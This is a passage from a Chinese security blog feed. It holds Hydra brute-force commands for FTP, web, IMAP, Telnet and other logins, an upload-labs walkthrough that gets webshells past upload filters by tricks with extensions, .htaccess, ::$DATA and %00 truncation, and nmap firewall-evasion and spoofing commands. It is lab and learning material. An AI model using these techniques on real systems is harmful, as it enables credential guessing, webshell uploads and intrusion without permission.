title="爆破 ftp"></a>爆破 ftp</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt -V 192.168.150.144 <span class="token function">ftp</span> -o ftp.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="get-方式登录，爆破-web-登录"><a href="#get-方式登录，爆破-web-登录" class="headerlink" title="get 方式登录，爆破 web 登录"></a>get 方式登录，爆破 web 登录</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt -vV -e n -f 192.168.150.144 http-get/admin/index.PHP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="post-方式登录，爆破-web登录"><a href="#post-方式登录，爆破-web登录" class="headerlink" title="post 方式登录，爆破 web登录"></a>post 方式登录，爆破 web登录</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt 192.168.150.144 http-post-form <span class="token string">"/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorrypassword"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="爆破-HTTPS"><a href="#爆破-HTTPS" class="headerlink" title="爆破 HTTPS"></a>爆破 HTTPS</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -m /index.php -l username -P pass.txt 192.168.150.144 https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="爆破思科"><a href="#爆破思科" class="headerlink" title="爆破思科"></a>爆破思科</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -P pass.txt 192.168.150.144 ciscohydra -m cloud -P pass.txt 192.168.150.144 cisco-enable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="破解-teamspeak"><a href="#破解-teamspeak" class="headerlink" title="破解 teamspeak"></a>破解 teamspeak</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt  -vV 192.168.150.144 teamspeak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="破解-pop3"><a href="#破解-pop3" class="headerlink" title="破解 pop3"></a>破解 pop3</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt my.pop3.mail pop3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="破解-http-proxy"><a href="#破解-http-proxy" class="headerlink" title="破解 http-proxy"></a>破解 http-proxy</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt http-proxy://192.168.150.144<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="破解imap"><a href="#破解imap" class="headerlink" title="破解imap"></a>破解imap</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt 192.168.150.144 imap PLAINhydra -C defaults.txt -6 imap://<span class="token punctuation">[</span>fe80::2c:31ff:fe12:ac11<span class="token punctuation">]</span>:143/PLAIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="破解-Telnet"><a href="#破解-Telnet" class="headerlink" title="破解 Telnet"></a>破解 Telnet</h3><pre class="line-numbers language-bash"><code class="language-bash">hydra 192.168.150.144 telnet -L user.txt -P pass.txt  -e ns -f -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/7805116.html" target="_blank" rel="noopener">【经验分享】Hydra(爆破神器)使用方法</a></p><p><a href="https://www.jianshu.com/p/4da49f179cee" target="_blank" rel="noopener">爆破工具 Hydra 简单使用</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs通关笔记</title>
      <link href="/2020/01/15/upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/15/upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h2><hr><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>第一关是在客户端使用 js 对上传的图片进行检查，简单来说就是只要骗过我自己的浏览器就可以上传文件。</p><hr><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>表单中的 onsubmit 事件，会调用 js 函数来检查上传文件的扩展名。第一个方法就是把 onsubmit 事件删除。</p><hr><ol><li><strong>检查 from 表单的属性和触发的事件</strong></li></ol><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>return checkFile()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/02/8AR4GDrsPghZyVN.png" alt="Pass01-1.png"></p><p>onsubmit 表示表单提交时验证的事件，它是在表单中的确认按钮被点击时出发的，一般是 js 函数。</p><ol start="2"><li><strong>删除 <code>onsubmit</code> 事件，并尝试上传 php 文件</strong></li></ol><p><img src="https://i.loli.net/2019/12/02/MUYgtmuGSqaHzZO.png" alt="Pass01-2.png"></p><p>注：从上图可以看到 php 文件已经上传成功</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>既然是调用 js 进行验证的，我把 js 禁用掉不就行了</p><hr><ol><li><strong>禁止网站使用 js 脚本</strong></li></ol><p><img src="https://i.loli.net/2020/01/07/hwVMFj7YRDuqg9Q.png" alt="Pass01-3.png"></p><ol start="2"><li><strong>刷新网站，上传文件</strong></li></ol><p><img src="https://i.loli.net/2020/01/07/jqFABxa3LliYrgN.png" alt="Pass01-4.png"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>将文件后缀改为 png，然后再使用 burpsuite 抓包将后缀改为 php</p><hr><ol><li><strong>抓包修改后缀</strong></li></ol><p><img src="https://i.loli.net/2020/01/07/QJd1ezYgEZCnAK4.png" alt="Pass01-5.png"></p><ol start="2"><li><strong>上传成功</strong></li></ol><p><img src="https://i.loli.net/2020/01/07/BNwWiEzXDRFkPHe.png" alt="Pass01-6.png"></p><h2 id="Pass02"><a href="#Pass02" class="headerlink" title="Pass02"></a>Pass02</h2><p>第二关是服务端对数据包的 MIME 进行检查，简单来说就是检查 HTTP 头的 Content-Type 字段。</p><hr><ol><li>选择好要上传的 webshell</li></ol><p><img src="https://i.loli.net/2019/12/26/wJx2NKV9tWrmDzQ.png" alt="Pass02-2.png"></p><ol start="2"><li>设置好 burpsuite 和 firefox</li></ol><p><img src="https://i.loli.net/2019/12/26/IW7FdDQ8mC4J2Mp.png" alt="Pass02-3.png"></p><p><img src="https://i.loli.net/2019/12/26/SwRk1t4XAnfYgar.png" alt="Pass02-4.png"></p><p><img src="https://i.loli.net/2019/12/26/czQfE6FKlJ1YARG.png" alt="Pass02-5.png"></p><ol start="3"><li>点击 “上传”，可以看到抓的数据包</li></ol><p><img src="https://i.loli.net/2019/12/26/8DLHIFwKUxlzkjp.png" alt="Pass02-6.png"></p><ol start="4"><li>将 “Content-Type” 改为 “image/png”</li></ol><p><img src="https://i.loli.net/2019/12/26/JVDlty9aXrh7mSQ.png" alt="Pass02-7.png"></p><ol start="5"><li>点击 “forward” 提交修改后数据包</li></ol><p><img src="https://i.loli.net/2019/12/26/q5ebfsFRdYQySnG.png" alt="Pass02-8.png"></p><ol start="6"><li>关闭 “Intercept is off”</li></ol><p><img src="https://i.loli.net/2019/12/26/JDxiGZSQFWmNavb.png" alt="Pass02-9.png"></p><ol start="7"><li>最后可以看到 webshell 上传成功</li></ol><p><img src="https://i.loli.net/2019/12/26/PTsA7yBX6urocmQ.png" alt="Pass02-10.png"></p><h2 id="Pass03"><a href="#Pass03" class="headerlink" title="Pass03"></a>Pass03</h2><p>第三关不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀。</p><hr><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>修改文件后缀，即可上传文件。例如：<code>.php .phtml .phps .php5 .pht</code></p><p>前提是 apache 的 httpd.conf 中有如下配置代码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 这行配置表示：将以 .php .phtml .phps .php5 .pht 为后缀的文件，会被当作正常的 php 文件去解析。如果没有这行配置，你上传的 webshell 是没有用的。</span>AddType application/x-httpd-php .php .phtml .phps .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/01/08/8sv52jpXiDnATb7.png" alt="Pass03-1.png"></p><h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><p>上传 .htaccess 文件。</p><hr><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><ul><li><p>说明：.htaccess文件是Apache服务器的一个配置文件，负责相关目录下的网页配置。</p></li><li><p>作用：通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></li></ul><ol><li><strong>在 http.conf 中开启 mod_rewrite 模块；在 /var/www/html 目录下开启 AllowOverride；指定 .htaccess 文件</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 开启 mod_rewrite 模块。作用：mod_rewrite 提供了基于正则表达式规则动态修改传入的请求的 URL 的方法。</span>LoadModule rewrite_module modules/mod_rewrite.so<span class="token comment" spellcheck="true"># AllowOverride 从字面上解释是允许覆盖的意思，即 Apache 允许另一配置文件覆盖现有配置文件。</span><span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/html"</span><span class="token operator">&gt;</span>AllowOverride All<span class="token operator">&lt;</span>/Directory<span class="token operator">&gt;</span><span class="token comment" spellcheck="true"># 在文件末尾添加，指定 .htaccess 文件</span>AccessFileName web.htaccess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><strong>编写 .htaccess 文件</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>FilesMatch <span class="token string">"webshell.png"</span><span class="token operator">&gt;</span>  SetHandler application/x-httpd-php<span class="token operator">&lt;</span>/FilesMatch<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li><strong>成功上传文件，效果如下图所示：</strong></li></ol><p><img src="https://i.loli.net/2020/01/08/VrP3edmC2TMvJ5p.png" alt="Pass03-2.png"></p><h3 id="方法三-1"><a href="#方法三-1" class="headerlink" title="方法三"></a>方法三</h3><p>抓包修改文件名</p><ol><li>将 webshell.php 改为 webshell.png</li></ol><p><img src="https://i.loli.net/2019/12/27/MlOEw3jDqymZIHL.png" alt="Pass03-3.png"></p><ol start="2"><li>可以看到 webshell 上传成功</li></ol><p><img src="https://i.loli.net/2019/12/27/eFcPws4GSQBNEdk.png" alt="Pass03-4.png"></p><h2 id="Pass04"><a href="#Pass04" class="headerlink" title="Pass04"></a>Pass04</h2><p>过滤了各种罕见后缀,但是没有过滤 .htaccess。</p><hr><h3 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h3><p>用 pass-03 的 .htaccess 方法即可，这里就不重复写了。</p><h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h3><p>同 Pass-03 抓包修改文件名</p><ol><li><strong>将 webshell.php 改为 webshell.png</strong></li></ol><p><img src="https://i.loli.net/2019/12/30/a7Nd1nMijBIvols.png" alt="Pass04-1.png"></p><ol start="2"><li><strong>可以看到 webshell 上传成功</strong></li></ol><p><img src="https://i.loli.net/2019/12/30/PqcoGJ4M3rSpxvh.png" alt="Pass04-2.png"></p><h2 id="Pass05"><a href="#Pass05" class="headerlink" title="Pass05"></a>Pass05</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><h3 id="方法一-3"><a href="#方法一-3" class="headerlink" title="方法一"></a>方法一</h3><p>对比 Pass04 和 Pass05 的源码，可以发现 Pass05 没有对上传的文件进行大小写转换。因此可以通过修改后缀大小写来绕过。</p><p><img src="https://i.loli.net/2020/01/09/sgdLiqQFE2UpXMm.png" alt="Pass05-1.png"></p><p><img src="https://i.loli.net/2020/01/09/ufRQTrNXiJ8Mg3c.png" alt="Pass05-2.png"></p><p>注：此方法只有在 windows 服务器中用，因为 windows 会忽略大小写。在 linux 中需要特殊配置才可使用。</p><h3 id="方法二-3"><a href="#方法二-3" class="headerlink" title="方法二"></a>方法二</h3><p>抓包修改文件名</p><ol><li><strong>将 webshell.php 改为 webshell.png</strong></li></ol><p><img src="https://i.loli.net/2019/12/30/GcpzrVakNOsAPbF.png" alt="Pass05-3.png"></p><ol start="2"><li><strong>可以看到 webshell 上传成功</strong></li></ol><p><img src="https://i.loli.net/2019/12/30/hd5eXWqcfMrA1TI.png" alt="Pass05-4.png"></p><h2 id="Pass06"><a href="#Pass06" class="headerlink" title="Pass06"></a>Pass06</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><h3 id="方法一-4"><a href="#方法一-4" class="headerlink" title="方法一"></a>方法一</h3><p>对比 Pass04 和 Pass06 的源码，可以发现 Pass06 没有对上传的文件结尾去空格。因此可以在文件末尾添加空格来绕过<br><img src="https://i.loli.net/2020/01/09/dnNiqFDIvMWeRXO.png" alt="Pass06-1.png"></p><p>抓包修改文件名，在文件名后添加空格</p><p><img src="https://i.loli.net/2020/01/09/8j3KSaTrtOZoWcB.png" alt="Pass06-2.png"></p><p><img src="https://i.loli.net/2020/01/09/tqcDP86HAdLv19k.png" alt="Pass06-3.png"></p><h3 id="方法二-4"><a href="#方法二-4" class="headerlink" title="方法二"></a>方法二</h3><p>抓包修改文件名</p><ol><li>将 webshell.php 改为 webshell.png</li></ol><p><img src="https://i.loli.net/2019/12/30/D5xmj91p4dLyvwF.png" alt="Pass06-4.png"></p><ol start="2"><li>可以看到 webshell 上传成功</li></ol><p><img src="https://i.loli.net/2019/12/30/YFLgZ5cWwksoGSh.png" alt="Pass06-5.png"></p><h2 id="Pass07"><a href="#Pass07" class="headerlink" title="Pass07"></a>Pass07</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><p>对比源码发现少了删除文件末尾的点的函数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有对后缀名进行去’.’处理，利用windows特性，会自动去掉后缀名中最后的’.’，上传后文件名后缀的点会被去除，所以可在抓包在后缀名后加’.’绕过</p><p><img src="https://i.loli.net/2020/01/10/7ysWLR8Np6huYBP.png" alt="Pass07-1.png"></p><p><img src="https://i.loli.net/2020/01/10/wN2W3YHm5LzEA1k.png" alt="Pass07-2.png"></p><h2 id="Pass08"><a href="#Pass08" class="headerlink" title="Pass08"></a>Pass08</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><p>对比源码发现缺少了去除字符串的函数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span>‘::<span class="token variable">$DATA</span>’, ‘’, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/01/10/R5idgO3C1BzVtrP.png" alt="Pass08-1.png"></p><p><img src="https://i.loli.net/2020/01/10/ydBC7loJOmf98sA.png" alt="Pass08-2.png"></p><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。上传.php::$DATA绕过。(仅限windows)</p><h2 id="Pass09"><a href="#Pass09" class="headerlink" title="Pass09"></a>Pass09</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><p>从源码中可以看到,deldot函数删除文件名末尾的点,最后的trim函数首尾去空格,就没有了对点的处理了,所以姿势就是在文件名后面加点空格点’. .’</p><p><img src="https://i.loli.net/2020/01/10/p6I2wM98WTEnONl.png" alt="Pass09-1.png"></p><p><img src="https://i.loli.net/2020/01/10/YTsVh3GfS9v2uW6.png" alt="Pass09-2.png"></p><p><img src="https://i.loli.net/2020/01/10/lC2QJpbTNH83kPE.png" alt="Pass09-3.png"></p><h2 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><p>看一下源码的 str_ireplace 函数可以知道,它把符合黑名单的后缀去掉了,因此可以想一些比较奇怪的后缀,使经过这个函数之后变成我们需要的后缀。是从左往右去掉后缀，因此可以把后缀名构建为.pphphp</p><p><img src="https://i.loli.net/2020/01/10/gy8SFrKx93BIQoH.png" alt="Pass10-1.png"></p><p><img src="https://i.loli.net/2020/01/10/fQ6pSybLHRAFc1g.png" alt="Pass10-2.png"></p><h2 id="Pass11"><a href="#Pass11" class="headerlink" title="Pass11"></a>Pass11</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><p>关键的代码在于这里的’save_path’是一个可控的变量，但是后面还拼接上一个后缀名，也需要绕过</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span>.<span class="token string">"/"</span>.rand<span class="token punctuation">(</span>10, 99<span class="token punctuation">)</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.<span class="token string">"."</span><span class="token keyword">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候可以使用%00截断，但这东西有点过气了，因为需要两个条件</p><ul><li>php 版本小于 5.3.4</li><li>php 的 magic_quotes_gpc 为 OFF 状态</li></ul><p>如果要完成这一个题目就必须要实现上面的两个条件，但是现在都PHP7了，这东西也就很少见了，满足上面的条件的时候php就是把它当成结束符，后面的数据直接忽略，这也导致了很多的问题，文件包含也可以利用这一点</p><p>所以如果要绕过，我们可以这样去实现，另save_path等于下面的值</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">..</span>/upload/1.php%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/01/10/1YFpaiXj5DZOUvc.png" alt="Pass11-1.png"></p><p><img src="https://i.loli.net/2020/01/10/YauvKZqN8wL3XI4.png" alt="Pass11-2.png"></p><p><img src="https://i.loli.net/2020/01/10/QwB6NaSUOr29Kq7.png" alt="Pass11-3.png"></p><p><img src="https://i.loli.net/2020/01/10/skyimfLxtG13ToB.png" alt="Pass11-4.png"></p><h2 id="Pass12"><a href="#Pass12" class="headerlink" title="Pass12"></a>Pass12</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><p>本关和 11 关一样，只是这一关是用 POST 方式上传文件。POST 方式不会像 get 一样自动 url 解码，所以需要手动将 %00 右键 url decode</p><p><img src="https://i.loli.net/2020/01/10/nyd6rwux1DP4SOv.png" alt="Pass12-1.png"></p><p><img src="https://i.loli.net/2020/01/10/Wrc8JoXxGU5p6jb.png" alt="Pass12-2.png"></p><p><img src="https://i.loli.net/2020/01/10/5gBNuCJywLZEA68.png" alt="Pass12-3.png"></p><h2 id="Pass13"><a href="#Pass13" class="headerlink" title="Pass13"></a>Pass13</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><p>这一关要求上传图片马，但是图片马是无法直接执行的。这里用到了文件包含漏洞，文件包含漏洞简单说就是，在这个include.php中需要引用其他应用程序，php中应用程序文件是.php也就是说，他本来想引用一个php文件，但是漏洞就是，他不会识别什么是php文件，只要是他引用的，他都当php来解析，所以如果他引用的是jpg，但是jpg中有图片马，那么他就相当于引用了图片马，同样的道理还会有zip马等等</p><h3 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h3><p>在 cmd 下使用 copy 命令将 doge.jpg 和 webshell.php 合并成 1.jpg</p><p><code>copy doge.jpg/b + webshell.php/a 1.jpg</code></p><p><img src="https://i.loli.net/2020/01/11/6okpW3d5FqBzgKt.png" alt="Pass13-1.png"></p><p><img src="https://i.loli.net/2020/01/11/ZHKUncGmCfXQVFx.png" alt="Pass13-2.png"></p><p><img src="https://i.loli.net/2020/01/11/DUpVoNPKh7uqYre.png" alt="Pass13-3.png"></p><p>注：最好使用 十几KB 的小图片来做图片马</p><h2 id="Pass14"><a href="#Pass14" class="headerlink" title="Pass14"></a>Pass14</h2><p>过滤了 .php|.php5|.php4|.php3|.htaccess 等各种罕见后缀后缀文件!</p><hr><p>这一关同 Pass13 ,这一关就是对图片的大小和后缀做了检查。上传的jpg 变成了 jepg</p><p><img src="https://i.loli.net/2020/01/11/ZRbr7lxNS3HM9pB.png" alt="Pass14-1.png"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://www.jianshu.com/p/5ebba0482980" target="_blank" rel="noopener">文件上传漏洞 学习笔记</a></p><p><a href="https://blog.csdn.net/u011377996/article/details/86776198" target="_blank" rel="noopener">upload-labs刷关记录</a></p><p><a href="https://xz.aliyun.com/t/4029#toc-0" target="_blank" rel="noopener">Upload-labs 20关通关笔记</a></p><p><a href="https://github.com/No-Github/1earn/blob/master/1earn/%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.md">upload-labs 通关笔记</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
            <tag> Upload vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap 常用命令</title>
      <link href="/2020/01/14/nmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/01/14/nmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap-执行流程"><a href="#nmap-执行流程" class="headerlink" title="nmap 执行流程"></a>nmap 执行流程</h2><p><img src="https://images2015.cnblogs.com/blog/483385/201706/483385-20170617203017009-1185205893.png" alt=""></p><h2 id="扫描主机是否存活"><a href="#扫描主机是否存活" class="headerlink" title="扫描主机是否存活"></a>扫描主机是否存活</h2><hr><ol><li>-–scanflags (定制的TCP扫描)</li></ol><p>可以是 URG， ACK，PSH， RST，SYN，and FIN 的任何组合</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --scanflags URGACKPSHRSTSYNFIN <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><hr><ol><li>列出开放了指定端口的主机列表</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -sT -p 80 -oG – 192.168.1.* <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>扫一眼目标机器或目标C段都跑了什么服务</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV -sT -Pn --open -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>尝试先获取下目标机器各个服务更详细的 banner 信息,因为有些服务工具漏洞只能影响特定的版本</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -sT -Pn --open -v banner.nse <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>无 ping 扫描(前提确认主机存活)</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -P0 -sS -sV <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="防火墙扫描"><a href="#防火墙扫描" class="headerlink" title="防火墙扫描"></a>防火墙扫描</h2><hr><pre class="line-numbers language-bash"><code class="language-bash">nmap --script<span class="token operator">=</span>firewalk --traceroute <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 --script http-waf-detect <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 --script http-waf-detect --script-args<span class="token operator">=</span>”http-waf-detect.detectBodyChanges” <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="绕过防火墙扫描"><a href="#绕过防火墙扫描" class="headerlink" title="绕过防火墙扫描"></a>绕过防火墙扫描</h2><hr><ol><li>碎片扫描</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -f <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap -mtu 8 <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>诱饵扫描</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -D RND:10 <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap –D decoy1,decoy2,decoy3 <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>空闲扫描</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -P0 -sI <span class="token operator">&lt;</span>僵尸主机 IP<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>随机数据长度</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap --data-length 25 <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap --randomize-hosts <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="5"><li>欺骗扫描</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap --sT -PN --spoof-mac 0 <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap --badsum <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap -g 80 -S www.baidu.com <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap -p80 --script http-methods --script-args http.useragent<span class="token operator">=</span><span class="token string">"Mozilla 5"</span> <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="按脚本分类扫描"><a href="#按脚本分类扫描" class="headerlink" title="按脚本分类扫描"></a>按脚本分类扫描</h2><hr><p>语法：</p><pre class="line-numbers 